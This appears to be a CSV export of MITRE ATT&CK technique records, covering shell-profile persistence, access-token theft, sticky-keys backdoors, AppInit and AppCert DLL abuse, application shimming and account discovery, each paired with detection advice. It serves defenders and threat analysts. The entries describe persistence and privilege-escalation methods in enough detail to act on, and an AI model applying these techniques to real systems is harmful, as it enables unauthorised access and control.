"type","id","created","modified","created_by_ref","name","description","kill_chain_phases","external_references","object_marking_refs","x_mitre_data_sources","x_mitre_permissions_required","x_mitre_platforms","spec_version","x_mitre_attack_spec_version","x_mitre_domains","x_mitre_modified_by_ref","x_mitre_version","x_mitre_contributors","x_mitre_effective_permissions","x_mitre_system_requirements","x_mitre_remote_support","x_mitre_network_requirements","x_mitre_defense_bypassed"
"attack-pattern","attack-pattern--01df3350-ce05-4bdf-bdf8-0a919a66d4a8","2017-12-14T16:46:06.044Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",".bash_profile and .bashrc","`~/.bash_profile` and `~/.bashrc` are executed in a user's context when a new shell opens or when a user logs in so that their environment is set correctly. `~/.bash_profile` is executed for login shells and `~/.bashrc` is executed for interactive non-login shells. This means that when a user logs in (via username and password) to the console (either locally or remotely via something like SSH), `~/.bash_profile` is executed before the initial command prompt is returned to the user. After that, every time a new shell is opened, `~/.bashrc` is executed. This allows users more fine grained control over when they want certain commands executed.

Mac's Terminal.app is a little different in that it runs a login shell by default each time a new terminal window is opened, thus calling `~/.bash_profile` each time instead of `~/.bashrc`.

These files are meant to be written to by the local user to configure their own environment; however, adversaries can also insert code into these files to gain persistence each time a user logs in or opens a new shell.

Detection: While users may customize their `~/.bashrc` and `~/.bash_profile` files , there are only certain types of commands that typically appear in these files. Monitor for abnormal commands such as execution of unknown programs, opening network sockets, or reaching out across the network when user profiles are loaded during the login process.

Platforms: Linux, macOS

Data Sources: File monitoring, Process Monitoring, Process command-line parameters, Process use of network

Permissions Required: User, Administrator","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'persistence'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1156', 'external_id': 'T1156'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['File monitoring', 'Process Monitoring', 'Process command-line parameters', 'Process use of network']","['User', 'Administrator']","['Linux', 'macOS']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","",""
"attack-pattern","attack-pattern--dcaa092b-7de9-4a21-977f-7fcb77e89c48","2017-12-14T16:46:06.044Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Access Token Manipulation","Windows uses access tokens to determine the ownership of a running process.  A user can manipulate access tokens to make a running process appear as though it belongs to someone other than the user that started the process.  When this occurs, the process also takes on the security context associated with the new token.  For example, Microsoft promotes the use of access tokens as a security best practice.  Administrators should log in as a standard user but run their tools with administrator privileges using the built-in access token manipulation command `runas`.  (Citation: Microsoft runas)
  
Adversaries may use access tokens to operate under a different user or system security context to perform actions and evade detection. An adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing.  An adversary must already be in a privileged user context (i.e. administrator) to steal a token.  However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level. An adversary can use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system. (Citation: Pentestlab Token Manipulation)

Access tokens can be leveraged by adversaries through three methods: (Citation: BlackHat Atkinson Winchester Token Manipulation)

'''Token Impersonation/Theft''' - An adversary creates a new access token that duplicates an existing token using `DuplicateToken(Ex)`. The token can then be used with `ImpersonateLoggedOnUser` to allow the calling thread to impersonate a logged on user's security context, or with `SetThreadToken` to assign the impersonated token to a thread. This is useful for when the target user has a non-network logon session on the system.

'''Create Process with a Token''' - An adversary creates a new access token with `DuplicateToken(Ex)` and uses it with `CreateProcessWithTokenW` to create a new process running under the security context of the impersonated user. This is useful for creating a new process under the security context of a different user.

'''Make and Impersonate Token''' - An adversary has a username and password but the user is not logged onto the system. The adversary can then create a logon session for the user using the `LogonUser` function. The function will return a copy of the new session's access token and the adversary can use `SetThreadToken` to assign the token to a thread.

Any standard user can use the `runas` command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account.

Metasploit’s Meterpreter payload allows arbitrary token manipulation and uses token impersonation to escalate privileges.  (Citation: Metasploit access token)  The Cobalt Strike beacon payload allows arbitrary token impersonation and can also create tokens.  (Citation: Cobalt Strike Access Token)

Detection: If an adversary is using a standard command-line shell, analysts can detect token manipulation by auditing command-line activity.  Specifically, analysts should look for use of the `runas` command. Detailed command-line logging is not enabled by default in Windows. (Citation: Microsoft Command-line Logging)

If an adversary is using a payload that calls the Windows token APIs directly, analysts can detect token manipulation only through careful analysis of user network activity, examination of running processes, and correlation with other endpoint and network behavior.  

There are many Windows API calls a payload can take advantage of to manipulate access tokens (e.g., `LogonUser` (Citation: Microsoft LogonUser), `DuplicateTokenEx` (Citation: Microsoft DuplicateTokenEx), and `ImpersonateLoggedOnUser` (Citation: Microsoft ImpersonateLoggedOnUser)).  Please see the referenced Windows API pages for more information.

Query systems for process and thread token information and look for inconsistencies such as user owns processes impersonating the local SYSTEM account. (Citation: BlackHat Atkinson Winchester Token Manipulation)

Platforms: Windows

Data Sources: API monitoring, Access Tokens

Effective Permissions: SYSTEM

Permissions Required: User, Administrator

Contributors: Tom Ueltschi @c_APT_ure, Travis Smith, Tripwire, Jared Atkinson, @jaredcatkinson, Robby Winchester, @robwinchester3","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'defense-evasion'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'privilege-escalation'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1134', 'external_id': 'T1134'}, {'source_name': 'Microsoft runas', 'description': 'Microsoft TechNet. (n.d.). Runas. Retrieved April 21, 2017.', 'url': 'https://technet.microsoft.com/en-us/library/bb490994.aspx'}, {'source_name': 'Pentestlab Token Manipulation', 'description': 'netbiosX. (2017, April 3). Token Manipulation. Retrieved April 21, 2017.', 'url': 'https://pentestlab.blog/2017/04/03/token-manipulation/'}, {'source_name': 'Metasploit access token', 'description': 'Offensive Security. (n.d.). What is Incognito. Retrieved April 21, 2017.', 'url': 'https://www.offensive-security.com/metasploit-unleashed/fun-incognito/'}, {'source_name': 'Cobalt Strike Access Token', 'description': 'Mudge, R. (n.d.). Windows Access Tokens and Alternate Credentials. Retrieved April 21, 2017.', 'url': 'https://blog.cobaltstrike.com/2015/12/16/windows-access-tokens-and-alternate-credentials/'}, {'source_name': 'Microsoft Command-line Logging', 'description': 'Mathers, B. (2017, March 7). Command line process auditing. Retrieved April 21, 2017.', 'url': 'https://technet.microsoft.com/en-us/windows-server-docs/identity/ad-ds/manage/component-updates/command-line-process-auditing'}, {'source_name': 'Microsoft LogonUser', 'description': 'Microsoft TechNet. (n.d.).  Retrieved April 25, 2017.', 'url': 'https://msdn.microsoft.com/en-us/library/windows/desktop/aa378184(v=vs.85).aspx'}, {'source_name': 'Microsoft DuplicateTokenEx', 'description': 'Microsoft TechNet. (n.d.).  Retrieved April 25, 2017.', 'url': 'https://msdn.microsoft.com/en-us/library/windows/desktop/aa446617(v=vs.85).aspx'}, {'source_name': 'Microsoft ImpersonateLoggedOnUser', 'description': 'Microsoft TechNet. (n.d.).  Retrieved April 25, 2017.', 'url': 'https://msdn.microsoft.com/en-us/library/windows/desktop/aa378612(v=vs.85).aspx'}, {'source_name': 'BlackHat Atkinson Winchester Token Manipulation', 'description': 'Atkinson, J., Winchester, R. (2017, December 7). A Process is No One: Hunting for Token Manipulation. Retrieved December 21, 2017.', 'url': 'https://www.blackhat.com/docs/eu-17/materials/eu-17-Atkinson-A-Process-Is-No-One-Hunting-For-Token-Manipulation.pdf'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['API monitoring', 'Access Tokens']","['User', 'Administrator']","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","['Tom Ueltschi @c_APT_ure', 'Travis Smith, Tripwire', 'Jared Atkinson, @jaredcatkinson', 'Robby Winchester, @robwinchester3']","['SYSTEM']","","","",""
"attack-pattern","attack-pattern--9b99b83a-1aac-4e29-b975-b374950551a3","2017-05-31T21:30:26.946Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Accessibility Features","Windows contains accessibility features that may be launched with a key combination before a user has logged in (for example, when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.

Two common accessibility programs are `C:\Windows\System32\sethc.exe`, launched when the shift key is pressed five times and `C:\Windows\System32\utilman.exe`, launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as ""sticky keys"", and has been used by adversaries for unauthenticated access through a remote desktop login screen. (Citation: FireEye Hikit Rootkit)

Depending on the version of Windows, an adversary may take advantage of these features in different ways because of code integrity enhancements. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in `%systemdir%\`, and it must be protected by Windows File or Resource Protection (WFP/WRP). (Citation: DEFCON2016 Sticky Keys) The debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced. Examples for both methods:

For simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g., `C:\Windows\System32\utilman.exe`) may be replaced with ""cmd.exe"" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over Remote Desktop Protocol will cause the replaced file to be executed with SYSTEM privileges. (Citation: Tilbury 2014)

For the debugger method on Windows Vista and later as well as Windows Server 2008 and later, for example, a Registry key may be modified that configures ""cmd.exe,"" or another program that provides backdoor access, as a ""debugger"" for the accessibility program (e.g., ""utilman.exe""). After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected with RDP will cause the ""debugger"" program to be executed with SYSTEM privileges. (Citation: Tilbury 2014)

Other accessibility features exist that may also be leveraged in a similar fashion: (Citation: DEFCON2016 Sticky Keys)

*On-Screen Keyboard: `C:\Windows\System32\osk.exe`
*Magnifier: `C:\Windows\System32\Magnify.exe`
*Narrator: `C:\Windows\System32\Narrator.exe`
*Display Switcher: `C:\Windows\System32\DisplaySwitch.exe`
*App Switcher: `C:\Windows\System32\AtBroker.exe`

Detection: Changes to accessibility utility binaries or binary paths that do not correlate with known software, patch cycles, etc., are suspicious. Command line invocation of tools capable of modifying the Registry for associated keys are also suspicious. Utility arguments and the binaries themselves should be monitored for changes. Monitor Registry keys within `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options`.

Platforms: Windows

Data Sources: Windows Registry, File monitoring, Process monitoring

Effective Permissions: SYSTEM

Permissions Required: Administrator

Contributors: Paul Speulstra, AECOM Global Security Operations Center","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'persistence'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'privilege-escalation'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1015', 'external_id': 'T1015'}, {'source_name': 'FireEye Hikit Rootkit', 'description': 'Glyer, C., Kazanciyan, R. (2012, August 20). THE “HIKIT” ROOTKIT: ADVANCED AND PERSISTENT ATTACK TECHNIQUES (PART 1). Retrieved June 6, 2016.', 'url': 'https://www.fireeye.com/blog/threat-research/2012/08/hikit-rootkit-advanced-persistent-attack-techniques-part-1.html'}, {'source_name': 'DEFCON2016 Sticky Keys', 'description': 'Maldonado, D., McGuffin, T. (2016, August 6). Sticky Keys to the Kingdom. Retrieved July 5, 2017.', 'url': 'https://www.slideshare.net/DennisMaldonado5/sticky-keys-to-the-kingdom'}, {'source_name': 'Tilbury 2014', 'description': 'Tilbury, C. (2014, August 28). Registry Analysis with CrowdResponse. Retrieved November 12, 2014.', 'url': 'http://blog.crowdstrike.com/registry-analysis-with-crowdresponse/'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Windows Registry', 'File monitoring', 'Process monitoring']","['Administrator']","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","['Paul Speulstra, AECOM Global Security Operations Center']","['SYSTEM']","","","",""
"attack-pattern","attack-pattern--72b74d71-8169-42aa-92e0-e7b04b9f5a08","2017-05-31T21:31:06.988Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Account Discovery","Adversaries may attempt to get a listing of local system or domain accounts. 

===Windows===

Example commands that can acquire this information are `net user`, `net group <groupname>`, and `net localgroup <groupname>` using the Net utility or through use of dsquery. If adversaries attempt to identify the primary user, currently logged in user, or set of users that commonly uses a system, System Owner/User Discovery may apply.

===Mac===

On Mac, groups can be enumerated through the `groups` and `id` commands. In mac specifically, `dscl . list /Groups` and `dscacheutil -q group` can also be used to enumerate groups and users.

===Linux===

On Linux, local users can be enumerated through the use of the `/etc/passwd` file which is world readable. In mac, this same file is only used in single-user mode in addition to the `/etc/master.passwd` file.

Also, groups can be enumerated through the `groups` and `id` commands. In mac specifically, `dscl . list /Groups` and `dscacheutil -q group` can also be used to enumerate groups and users.

Detection: System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.

Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.

Platforms: Linux, macOS, Windows

Data Sources: API monitoring, Process command-line parameters, Process monitoring

Permissions Required: User

Contributors: Travis Smith, Tripwire","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'discovery'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1087', 'external_id': 'T1087'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['API monitoring', 'Process command-line parameters', 'Process monitoring']","['User']","['Linux', 'macOS', 'Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","['Travis Smith, Tripwire']","","","","",""
"attack-pattern","attack-pattern--a10641f4-87b4-45a3-a906-92a149cb2c27","2017-05-31T21:31:12.196Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Account Manipulation","Account manipulation may aid adversaries in maintaining access to credentials and certain permission levels within an environment. Manipulation could consist of modifying permissions, modifying credentials, adding or changing permission groups, modifying account settings, or modifying how authentication is performed. In order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain.

Detection: Collect events that correlate with changes to account objects on systems and the domain, such as event ID 4738. (Citation: Microsoft User Modified Event) Monitor for modification of accounts in correlation with other suspicious activity. Changes may occur at unusual times or from unusual systems. Especially flag events where the subject and target accounts differ (Citation: InsiderThreat ChangeNTLM July 2017) or that include additional flags such as changing a password without knowledge of the old password. (Citation: GitHub Mimikatz Issue 92 June 2017)

Use of credentials may also occur at unusual times or to unusual systems or services and may correlate with other suspicious activity.

Platforms: Windows

Data Sources: Authentication logs, API monitoring, Windows event logs, Packet capture

Permissions Required: Administrator","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'credential-access'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1098', 'external_id': 'T1098'}, {'source_name': 'Microsoft User Modified Event', 'description': 'Lich, B., Miroshnikov, A. (2017, April 5). 4738(S): A user account was changed. Retrieved June 30, 2017.', 'url': 'https://docs.microsoft.com/windows/device-security/auditing/event-4738'}, {'source_name': 'InsiderThreat ChangeNTLM July 2017', 'description': 'Warren, J. (2017, July 11). Manipulating User Passwords with Mimikatz. Retrieved December 4, 2017.', 'url': 'https://blog.stealthbits.com/manipulating-user-passwords-with-mimikatz-SetNTLM-ChangeNTLM'}, {'source_name': 'GitHub Mimikatz Issue 92 June 2017', 'description': 'Warren, J. (2017, June 22). lsadump::changentlm and lsadump::setntlm work, but generate Windows events #92. Retrieved December 4, 2017.', 'url': 'https://github.com/gentilkiwi/mimikatz/issues/92'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Authentication logs', 'API monitoring', 'Windows event logs', 'Packet capture']","['Administrator']","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","",""
"attack-pattern","attack-pattern--4bf5845d-a814-4490-bc5c-ccdee6043025","2018-01-16T16:13:52.465Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","AppCert DLLs","Dynamic-link libraries (DLLs) that are specified in the AppCertDLLs value in the Registry key `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager` are loaded into every process that calls the ubiquitously used application programming interface (API) functions: (Citation: Engame Process Injection July 2017)
*CreateProcess
*CreateProcessAsUser
*CreateProcessWithLoginW
*CreateProcessWithTokenW
*WinExec
Similar to Process Injection, this value can be abused to obtain persistence and privilege escalation by causing a malicious DLL to be loaded and run in the context of separate processes on the computer.

Detection: Monitor DLL loads by processes, specifically looking for DLLs that are not recognized or not normally loaded into a process. Monitor the AppCertDLLs Registry value for modifications that do not correlate with known software, patch cycles, etc. Monitor and analyze application programming interface (API) calls that are indicative of Registry edits such as RegCreateKeyEx and RegSetValueEx. (Citation: Engame Process Injection July 2017) 

Tools such as Sysinternals Autoruns may overlook AppCert DLLs as an auto-starting location. (Citation: TechNet Autoruns) (Citation: Sysinternals AppCertDlls Oct 2007)

Look for abnormal process behavior that may be due to a process loading a malicious DLL. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as making network connections for Command and Control, learning details about the environment through Discovery, and conducting Lateral Movement.

Platforms: Windows

Data Sources: Loaded DLLs, Process Monitoring, Windows Registry

Effective Permissions: Administrator, SYSTEM

Permissions Required: Administrator, SYSTEM","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'persistence'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'privilege-escalation'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1182', 'external_id': 'T1182'}, {'source_name': 'Engame Process Injection July 2017', 'description': 'Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.', 'url': 'https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process'}, {'source_name': 'TechNet Autoruns', 'description': 'Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.', 'url': 'https://technet.microsoft.com/en-us/sysinternals/bb963902'}, {'source_name': 'Sysinternals AppCertDlls Oct 2007', 'description': 'Microsoft. (2007, October 24). Windows Sysinternals - AppCertDlls. Retrieved December 18, 2017.', 'url': 'https://forum.sysinternals.com/appcertdlls%20topic12546.html'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Loaded DLLs', 'Process Monitoring', 'Windows Registry']","['Administrator', 'SYSTEM']","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","['Administrator', 'SYSTEM']","","","",""
"attack-pattern","attack-pattern--317fefa6-46c7-4062-adb6-2008cf6bcb41","2017-05-31T21:31:15.409Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","AppInit DLLs","Dynamic-link libraries (DLLs) that are specified in the AppInit_DLLs value in the Registry keys `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows` or `HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows` are loaded by user32.dll into every process that loads user32.dll. In practice this is nearly every program, since user32.dll is a very common library. (Citation: Engame Process Injection July 2017) Similar to Process Injection, these values can be abused to obtain persistence and privilege escalation by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. (Citation: AppInit Registry)

The AppInit DLL functionality is disabled in Windows 8 and later versions when secure boot is enabled. (Citation: AppInit Secure Boot)

Detection: Monitor DLL loads by processes that load user32.dll and look for DLLs that are not recognized or not normally loaded into a process. Monitor the AppInit_DLLs Registry values for modifications that do not correlate with known software, patch cycles, etc. Monitor and analyze application programming interface (API) calls that are indicative of Registry edits such as RegCreateKeyEx and RegSetValueEx. (Citation: Engame Process Injection July 2017) Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current AppInit DLLs. (Citation: TechNet Autoruns) 

Look for abnormal process behavior that may be due to a process loading a malicious DLL. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as making network connections for Command and Control, learning details about the environment through Discovery, and conducting Lateral Movement.

Platforms: Windows

Data Sources: Loaded DLLs, Process monitoring, Windows Registry

Effective Permissions: Administrator, SYSTEM

Permissions Required: Administrator

System Requirements: Secure boot disabled on systems running Windows 8 and later","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'persistence'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'privilege-escalation'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1103', 'external_id': 'T1103'}, {'source_name': 'AppInit Registry', 'description': 'Microsoft. (2006, October). Working with the AppInit_DLLs registry value. Retrieved July 15, 2015.', 'url': 'https://support.microsoft.com/en-us/kb/197571'}, {'source_name': 'AppInit Secure Boot', 'description': 'Microsoft. (n.d.). AppInit DLLs and Secure Boot. Retrieved July 15, 2015.', 'url': 'https://msdn.microsoft.com/en-us/library/dn280412'}, {'source_name': 'TechNet Autoruns', 'description': 'Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.', 'url': 'https://technet.microsoft.com/en-us/sysinternals/bb963902'}, {'source_name': 'Engame Process Injection July 2017', 'description': 'Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.', 'url': 'https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Loaded DLLs', 'Process monitoring', 'Windows Registry']","['Administrator']","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","['Administrator', 'SYSTEM']","['Secure boot disabled on systems running Windows 8 and later']","","",""
"attack-pattern","attack-pattern--5ad95aaa-49c1-4784-821d-2e83f47b079b","2017-12-14T16:46:06.044Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","AppleScript","macOS and OS X applications send AppleEvent messages to each other for interprocess communications (IPC). These messages can be easily scripted with AppleScript for local or remote IPC. Osascript executes AppleScript and any other Open Scripting Architecture (OSA) language scripts. A list of OSA languages installed on a system can be found by using the `osalang` program.
AppleEvent messages can be sent independently or as part of a script. These events can locate open windows, send keystrokes, and interact with almost any open application locally or remotely. 

Adversaries can use this to interact with open SSH connection, move to remote machines, and even present users with fake dialog boxes. These events cannot start applications remotely (they can start them locally though), but can interact with applications if they're already running remotely. Since this is a scripting language, it can be used to launch more common techniques as well such as a reverse shell via python  (Citation: Macro Malware Targets Macs). Scripts can be run from the command lie via `osascript /path/to/script` or `osascript -e ""script here""`.

Detection: Monitor for execution of AppleScript through osascript that may be related to other suspicious behavior occurring on the system.

Platforms: macOS

Data Sources: API monitoring, System calls, Process Monitoring, Process command-line parameters

Permissions Required: User

Remote Support: Yes","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'execution'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'lateral-movement'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1155', 'external_id': 'T1155'}, {'source_name': 'Macro Malware Targets Macs', 'description': 'Yerko Grbic. (2017, February 14). Macro Malware Targets Macs. Retrieved July 8, 2017.', 'url': 'https://securingtomorrow.mcafee.com/mcafee-labs/macro-malware-targets-macs/'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['API monitoring', 'System calls', 'Process Monitoring', 'Process command-line parameters']","['User']","['macOS']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","True","",""
"attack-pattern","attack-pattern--327f3cc5-eea1-42d4-a6cd-ed34b7ce8f61","2017-05-31T21:30:27.755Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Application Deployment Software","Adversaries may deploy malicious software to systems within a network using application deployment systems employed by enterprise administrators. The permissions required for this action vary by system configuration; local credentials may be sufficient with direct access to the deployment server, or specific domain credentials may be required. However, the system may require an administrative account to log in or to perform software deployment.

Access to a network-wide or enterprise-wide software deployment system enables an adversary to have remote code execution on all systems that are connected to such a system. The access may be used to laterally move to systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints.

Detection: Monitor application deployments from a secondary system. Perform application deployment at regular times so that irregular deployment activity stands out. Monitor process activity that does not correlate to known good software. Monitor account login activity on the deployment system.

Platforms: Linux, macOS, Windows

Data Sources: File monitoring, Process use of network, Process monitoring

System Requirements: Access to application deployment software (EPO, HPCA, Altiris, etc.)","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'lateral-movement'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1017', 'external_id': 'T1017'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['File monitoring', 'Process use of network', 'Process monitoring']","","['Linux', 'macOS', 'Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","['Access to application deployment software (EPO, HPCA, Altiris, etc.)']","","",""
"attack-pattern","attack-pattern--7c93aa74-4bc0-4a9e-90ea-f25f86301566","2017-12-14T16:46:06.044Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Application Shimming","The Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow backward compatibility of programs as Windows updates and changes its code. For example, the application shimming feature allows developers to apply fixes to applications (without rewriting code) that were created for Windows XP so that it will work with Windows 10. (Citation: Engame Process Injection July 2017) Within the framework, shims are created to act as a buffer between the program (or more specifically, the Import Address Table) and the Windows OS. When a program is executed, the shim cache is referenced to determine if the program requires the use of the shim database (.sdb). If so, the shim database uses Hooking to redirect the code as necessary in order to communicate with the OS. A list of all shims currently installed by the default Windows installer (sdbinst.exe) is kept in:

* `%WINDIR%\AppPatch\sysmain.sdb`
* `hklm\software\microsoft\windows nt\currentversion\appcompatflags\installedsdb`

Custom databases are stored in:

* `%WINDIR%\AppPatch\custom & %WINDIR%\AppPatch\AppPatch64\Custom`
* `hklm\software\microsoft\windows nt\currentversion\appcompatflags\custom`

To keep shims secure, Windows designed them to run in user mode so they cannot modify the kernel and you must have administrator privileges to install a shim. However, certain shims can be used to Bypass User Account Control (UAC) (RedirectEXE), inject DLLs into processes (InjectDLL), disable Data Execution Prevention (DisableNX) and Structure Exception Handling (DisableSEH), and intercept memory addresses (GetProcAddress). Similar to Hooking, utilizing these shims may allow an adversary to perform several malicious acts such as elevate privileges, install backdoors, disable defenses like Windows Defender, etc.

Detection: There are several public tools available that will detect shims that are currently available (Citation: Black Hat 2015 App Shim):

* Shim-Process-Scanner - checks memory of every running process for any Shim flags
* Shim-Detector-Lite - detects installation of custom shim databases
* Shim-Guard - monitors registry for any shim installations
* ShimScanner - forensic tool to find active shims in memory
* ShimCacheMem - Volatility plug-in that pulls shim cache from memory (note: shims are only cached after reboot)

Monitor process execution for sdbinst.exe and command-line arguments for potential indications of application shim abuse.

Platforms: Windows

Data Sources: Loaded DLLs, System calls, Windows Registry, Process Monitoring, Process command-line parameters

Permissions Required: Administrator","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'persistence'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'privilege-escalation'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1138', 'external_id': 'T1138'}, {'source_name': 'Black Hat 2015 App Shim', 'description': 'Pierce, Sean. (2015, November). Defending Against Malicious Application Compatibility Shims. Retrieved June 22, 2017.', 'url': 'https://www.blackhat.com/docs/eu-15/materials/eu-15-Pierce-Defending-Against-Malicious-Application-Compatibility-Shims-wp.pdf'}, {'source_name': 'Engame Process Injection July 2017', 'description': 'Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.', 'url': 'https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Loaded DLLs', 'System calls', 'Windows Registry', 'Process Monitoring', 'Process command-line parameters']","['Administrator']","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","",""
"attack-pattern","attack-pattern--4ae4f953-fe58-4cc8-a327-33257e30a830","2017-05-31T21:30:24.512Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Application Window Discovery","Adversaries may attempt to get a listing of open application windows. Window listings could convey information about how the system is used or give context to information collected by a keylogger.

In Mac, this can be done natively with a small AppleScript script.

Detection: System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.

Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.

Platforms: macOS, Windows

Data Sources: API monitoring, Process command-line parameters, Process monitoring

